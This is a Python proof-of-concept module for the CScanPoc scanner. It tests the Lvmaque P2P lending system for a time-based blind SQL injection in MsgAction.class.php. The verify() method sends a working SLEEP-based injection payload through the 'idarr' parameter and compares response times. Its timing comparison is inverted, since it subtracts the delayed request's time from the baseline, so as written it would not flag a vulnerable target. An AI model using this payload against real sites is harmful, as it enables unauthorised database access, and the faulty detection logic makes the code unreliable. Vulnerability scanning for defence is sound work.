# coding: utf-8
import time

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Lvmaque_0101'  # 平台漏洞编号
    name = '绿麻雀p2p网贷系统sql盲注'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-12-10'  # 漏洞公布时间
    desc = '''
    数字型注入
    漏洞文件:/App/Lib/Action/Member/MsgAction.class.php //46行
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=144792'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Lvmaque(绿麻雀)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '63b2f328-8b9e-4027-94f8-660bde66dcd5'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload1 = "/App/Lib/Action/Member/MsgAction.class.php"
            payload2 = "/App/Lib/Action/Member/MsgAction.class.php?idarr=2) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 1=1%23"
            url = self.target + payload1
            url2 = self.target + payload2
            start_time = time.time()
            _response = requests.get(url)
            end_time1 = time.time()
            _response = requests.get(url2)
            end_time2 = time.time()
            if (end_time1-start_time) - (end_time2-end_time1) > 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
